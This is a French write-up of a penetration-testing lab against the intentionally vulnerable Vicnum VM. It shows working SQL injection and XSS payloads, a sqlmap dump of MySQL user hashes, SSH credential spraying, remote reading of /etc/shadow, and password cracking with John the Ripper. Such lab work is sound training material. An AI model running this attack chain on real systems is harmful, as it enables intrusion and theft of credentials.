# Vicnum
1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌──[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh 

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.99
[i] Rate: 1000

🔥 Masscan 192.168.56.99...100%
👁️ Nmap 192.168.56.99...100%

 
[+] 80/tcp open
[+] 22/tcp open
 
==========================================================
|                       Rapports                         |
==========================================================
| Nmap:/home/parrot/Massap/192.168.56.99-tcp.html        |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">⚡</span> metaWeb**

Essayons de trouver des vulnérabilité sur URL `http://192.168.56.99/`

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $sh metaWeb.sh 

__________________________________________________________________/\\\______________/\\\_________________/\\\________        
 _________________________________________________________________\/\\\_____________\/\\\________________\/\\\________       
  ________________________________________/\\\_____________________\/\\\_____________\/\\\________________\/\\\________      
   ____/\\\\\__/\\\\\_______/\\\\\\\\___/\\\\\\\\\\\__/\\\\\\\\\____\//\\\____/\\\____/\\\______/\\\\\\\\__\/\\\________     
    __/\\\///\\\\\///\\\___/\\\/////\\\_\////\\\////__\////////\\\____\//\\\__/\\\\\__/\\\_____/\\\/////\\\_\/\\\\\\\\\__    
     _\/\\\_\//\\\__\/\\\__/\\\\\\\\\\\_____\/\\\________/\\\\\\\\\\____\//\\\/\\\/\\\/\\\_____/\\\\\\\\\\\__\/\\\////\\\_   
      _\/\\\__\/\\\__\/\\\_\//\\///////______\/\\\_/\\___/\\\/////\\\_____\//\\\\\\//\\\\\_____\//\\///////___\/\\\__\/\\\_  
       _\/\\\__\/\\\__\/\\\__\//\\\\\\\\\\____\//\\\\\___\//\\\\\\\\/\\_____\//\\\__\//\\\_______\//\\\\\\\\\\_\/\\\\\\\\\__ 
        _\///___\///___\///____\//////////______\/////_____\////////\//_______\///____\///_________\//////////__\/////////___
        
 by M0rPH3U53

      
[i] Scan IP: 192.168.56.99
[i] Nom du scan: Vicnum
 
⚛️ Nuclei 192.168.56.99...100%
👽 Nikto 192.168.56.99...100%
🐂 Wapiti 192.168.56.99...100%
🐟 Skipfish 192.168.56.99...100%
⚡ ZAP 192.168.56.99...100%
 
=====================================
|             📑 Rapports           |
=====================================
| /home/parrot/metaWeb/Vicnum/      |
=====================================
```

&nbsp;

**<span style="color: #dddddd;">📑</span> Rapport Wapiti**

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $cat metaWeb/Vicnum/wapiti/Vicnum-rapport.txt
********************************************************************************
                     Wapiti 3.0.4 - wapiti.sourceforge.io
                      Rapport pour http://192.168.56.99/
                Date du scan : Sat, 15 Feb 2025 23:30:11 +0000
                          Portée de ce scan : folder
********************************************************************************

Résumé des vulnérabilités :
---------------------------
                                                      Copie de sauvegarde :   0
                                                 Injection SQL en aveugle :   1
                                                     Identifiants faibles :   0
                                                           Injection CRLF :   0
               Configuration de la stratégie de securité du contenu (CSP) :   1
                                               Cross Site Request Forgery :   0
                                        Fichier potentiellement dangereux :   0
                                                    Exécution de commande :   0
                                                    Traversée de dossiers :   0
                                                Contournement de htaccess :   0
                                                      HTTP Secure Headers :   4
                                                     HttpOnly Flag cookie :   0
                                                            Open Redirect :   0
                                                       Secure Flag cookie :   0
                                                            Injection SQL :   1
                                              Server Side Request Forgery :   0
                                                     Cross Site Scripting :   2
                                                      XML External Entity :   0
********************************************************************************

Injection SQL en aveugle
------------------------
Vulnérabilité d'injection SQL en aveugle via une injection dans le paramètre player
Evil request:
    POST /vicnum5.php HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=%27+or+sleep%287%29%231
PoC en commande cURL : "curl "http://192.168.56.99/vicnum5.php" -e "http://192.168.56.99/" -d "player=%27+or+sleep%287%29%231""

                                  *   *   *

********************************************************************************

Configuration de la stratégie de securité du contenu (CSP)
----------------------------------------------------------
CSP n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

********************************************************************************

HTTP Secure Headers
-------------------
L'entête X-Frame-Options n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

L'entête X-XSS-Protection n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

L'entête X-Content-Type-Options n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

L'entête Strict-Transport-Security n'est pas défini
Evil request:
    GET / HTTP/1.1
    Host: 192.168.56.99
PoC en commande cURL : "curl "http://192.168.56.99/""

                                  *   *   *

********************************************************************************

Injection SQL
-------------
Injection SQL (DMBS: MySQL) via une injection dans le paramètre player
Evil request:
    POST /vicnum5.php HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=default%C2%BF%27%22%28
PoC en commande cURL : "curl "http://192.168.56.99/vicnum5.php" -e "http://192.168.56.99/" -d "player=default%C2%BF%27%22%28""

                                  *   *   *

********************************************************************************

Cross Site Scripting
--------------------
Vulnérabilité XSS trouvée via l'injection dans le paramètre player
Evil request:
    POST /cgi-bin/vicnum1.pl HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=%3CScRiPt%3Ealert%28%27wrvy2bqhzw%27%29%3C%2FsCrIpT%3E&admin=N
PoC en commande cURL : "curl "http://192.168.56.99/cgi-bin/vicnum1.pl" -e "http://192.168.56.99/" -d "player=%3CScRiPt%3Ealert%28%27wrvy2bqhzw%27%29%3C%2FsCrIpT%3E&admin=N""

                                  *   *   *

Vulnérabilité XSS trouvée via l'injection dans le paramètre player
Evil request:
    POST /vicnum5.php HTTP/1.1
    Host: 192.168.56.99
    Referer: http://192.168.56.99/
    Content-Type: application/x-www-form-urlencoded

    player=%3CScRiPt%3Ealert%28%27wx9h6utjyu%27%29%3C%2FsCrIpT%3E
PoC en commande cURL : "curl "http://192.168.56.99/vicnum5.php" -e "http://192.168.56.99/" -d "player=%3CScRiPt%3Ealert%28%27wx9h6utjyu%27%29%3C%2FsCrIpT%3E""

                                  *   *   *

********************************************************************************

Résumé des anomalies :
----------------------
                                                Erreur interne au serveur :   0
                                       Consommation anormale de ressource :   0
********************************************************************************
Résumé des informations complémentaires :
-----------------------------------------
                                               Technologie web identifiée :   0
********************************************************************************
```

&nbsp;

<span style="color: #dddddd;">🕳️</span> **Sqlmap**

Cherchons la table des utilisateurs

```
┌──[parrot@parrot]─[~/Documents]
└──╼ $sqlmap -u 'http://192.168.56.99/vicnum5.php' --data='player=default' --search -T user
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.12#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:35:26 /2025-02-16/

[11:35:26] [INFO] resuming back-end DBMS 'mysql' 
[11:35:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: player (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: player=1' OR NOT 6340=6340#

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: player=1' OR ROW(8257,2677)>(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(8257=8257,1))),0x71766a6271,FLOOR(RAND(0)*2))x FROM (SELECT 4478 UNION SELECT 6135 UNION SELECT 6554 UNION SELECT 2407)a GROUP BY x)-- hIpM

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: player=1' AND (SELECT 8089 FROM (SELECT(SLEEP(5)))tHQw)-- YyIe

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: player=1' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7176716b71,0x65505350614d4c6345526e6369685973475055424e554a774b4a544f69674d724746414d71675761,0x71766a6271)#
---
[11:35:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 4.1
do you want sqlmap to consider provided table(s):
[1] as LIKE table names (default)
[2] as exact table names
> 2
[11:35:28] [INFO] searching table 'user'
[11:35:28] [WARNING] reflective value(s) found and filtering out
Database: mysql
[1 table]
+------+
| user |
+------+

do you want to dump found table(s) entries? [Y/n] y
which database(s)?
[a]ll (default)
[mysql]
[q]uit
> mysql
which table(s) of database 'mysql'?
[a]ll (default)
[user]
[s]kip
[q]uit
> user
[11:35:45] [INFO] fetching columns for table 'user' in database 'mysql'
[11:35:45] [INFO] fetching entries for table 'user' in database 'mysql'
[11:35:45] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[11:35:48] [INFO] writing hashes to a temporary file '/tmp/sqlmappg5q5zkb9656/sqlmaphashes-tbv49my_.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[11:35:55] [INFO] using hash method 'mysql_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[11:35:58] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[11:36:00] [INFO] starting dictionary-based cracking (mysql_passwd)
[11:36:00] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[11:36:48] [WARNING] no clear password(s) found                                                                                                                                              
Database: mysql
Table: user
[6 entries]
+--------------+------------------+-------------------------------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+--------------------+---------------------+-----------------------+------------------------+
| Host         | User             | Password                                  | ssl_type | Drop_priv | File_priv | Alter_priv | Grant_priv | Index_priv | Super_priv | ssl_cipher | Create_priv | Delete_priv | Insert_priv | Reload_priv | Select_priv | Update_priv | max_updates | x509_issuer | Execute_priv | Process_priv | Show_db_priv | x509_subject | Shutdown_priv | max_questions | Show_view_priv | References_priv | Repl_slave_priv | max_connections | Create_user_priv | Create_view_priv | Lock_tables_priv | Repl_client_priv | Alter_routine_priv | Create_routine_priv | Create_tmp_table_priv | max_user_connections   |
+--------------+------------------+-------------------------------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+--------------------+---------------------+-----------------------+------------------------+
| localhost    | root             | *C7847100CDBE29050A338F78EA71F066D196ED98 | <blank>  | Y         | Y         | Y          | Y          | Y          | Y          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | Y            | Y            | Y            | <blank>      | Y             | 0             | Y              | Y               | Y               | 0               | Y                | Y                | Y                | Y                | Y                  | Y                   | Y                     | 0                      |
| ubuntuserver | root             | *32D2D05077469E6123BBF62AE013A03270BCBEC5 | <blank>  | Y         | Y         | Y          | Y          | Y          | Y          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | Y            | Y            | Y            | <blank>      | Y             | 0             | Y              | Y               | Y               | 0               | Y                | Y                | Y                | Y                | Y                  | Y                   | Y                     | 0                      |
| 127.0.0.1    | root             | *32D2D05077469E6123BBF62AE013A03270BCBEC5 | <blank>  | Y         | Y         | Y          | Y          | Y          | Y          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | Y            | Y            | Y            | <blank>      | Y             | 0             | Y              | Y               | Y               | 0               | Y                | Y                | Y                | Y                | Y                  | Y                   | Y                     | 0                      |
| localhost    | <blank>          | <blank>                                   | <blank>  | N         | N         | N          | N          | N          | N          | <blank>    | N           | N           | N           | N           | N           | N           | 0           | <blank>     | N            | N            | N            | <blank>      | N             | 0             | N              | N               | N               | 0               | N                | N                | N                | N                | N                  | N                   | N                     | 0                      |
| ubuntuserver | <blank>          | <blank>                                   | <blank>  | N         | N         | N          | N          | N          | N          | <blank>    | N           | N           | N           | N           | N           | N           | 0           | <blank>     | N            | N            | N            | <blank>      | N             | 0             | N              | N               | N               | 0               | N                | N                | N                | N                | N                  | N                   | N                     | 0                      |
| localhost    | debian-sys-maint | *B5FCC1DC05A8159A55F133508A51FDC63066600F | <blank>  | Y         | Y         | Y          | Y          | Y          | Y          | <blank>    | Y           | Y           | Y           | Y           | Y           | Y           | 0           | <blank>     | Y            | Y            | Y            | <blank>      | Y             | 0             | N              | Y               | Y               | 0               | N                | N                | Y                | Y                | N                  | N                   | Y                     | 0                      |
+--------------+------------------+-------------------------------------------+----------+-----------+-----------+------------+------------+------------+------------+------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+-------------+--------------+--------------+--------------+--------------+---------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+------------------+------------------+------------------+--------------------+---------------------+-----------------------+------------------------+

[11:36:48] [INFO] table 'mysql.`user`' dumped to CSV file '/home/parrot/.local/share/sqlmap/output/192.168.56.99/dump/mysql/user.csv'
[11:36:48] [INFO] fetched data logged to text files under '/home/parrot/.local/share/sqlmap/output/192.168.56.99'

[*] ending @ 11:36:48 /2025-02-16/

```

&nbsp;

**CrackStation**

Crack des hash `mysql` de l’utilisateur `root`

![Capture du 2025-02-16 11-45-28](https://github.com/user-attachments/assets/88323ddf-b592-493f-945e-a9dd2982d2ab)


&nbsp;

**<span style="color: #dddddd;">🖥️</span> NetExec**

Test des 2 mot de passe trouver en `SSH`

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.99 -u root -p password.txt                                      
SSH         192.168.56.99   22     192.168.56.99    [*] SSH-2.0-OpenSSH_5.1p1 Debian-3ubuntu1
SSH         192.168.56.99   22     192.168.56.99    [+] root:vicnum (Pwn3d!) Linux - Shell access!
```

&nbsp;

Dump des hash utilisateur

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $nxc ssh 192.168.56.99 -u root -p vicnum -x 'cat /etc/shadow'
SSH         192.168.56.99   22     192.168.56.99    [*] SSH-2.0-OpenSSH_5.1p1 Debian-3ubuntu1
SSH         192.168.56.99   22     192.168.56.99    [+] root:vicnum (Pwn3d!) Linux - Shell access!
SSH         192.168.56.99   22     192.168.56.99    [+] Executed command
SSH         192.168.56.99   22     192.168.56.99    root:$6$l25OUVzq$bLY58QiHVHUWUFpVuOaKGFpdyxG7n6I/r5IQZtE6JRRISWFPf7bBaK2KF2/Dza0eXR47zhQ/qknLeCU.mgInw1:14256:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    daemon:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    bin:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    sys:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    sync:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    games:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    man:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    lp:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    mail:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    news:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    uucp:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    proxy:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    www-data:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    backup:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    list:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    irc:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    gnats:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    nobody:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    libuuid:!:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    syslog:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    klog:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    mysql:!:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    sshd:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    messagebus:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    landscape:*:14253:0:99999:7:::
SSH         192.168.56.99   22     192.168.56.99    vicnum:$6$U5S9S6hr$3k2z9vFUfV0IUs1V0undItFs0W7v5ifzCnRzXHp4CAEGJ6WqihshfeI/I9AaCWsrZhbKGCU6e1eXMG/dHvsda.:14498:0:99999:7:::
```

&nbsp;

<span style="color: #dddddd;">🧨</span> **JohnTheRipper**

Crack du mot de passe de l’utilisateur `vicnum`

```
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john vicnum --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
vicnum           (vicnum)     
1g 0:00:00:00 DONE (2025-02-16 12:15) 8.333g/s 1066p/s 1066c/s 1066C/s vicnum..112233
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
┌─[parrot@parrot]─[~/Desktop]
└──╼ $john vicnum --show
vicnum:vicnum:14498:0:99999

1 password hash cracked, 0 left
```

&nbsp;

Identifiant trouver

| Users | Password |
| --- | --- |
| vicnum | vicnum |
| root | vicnum |
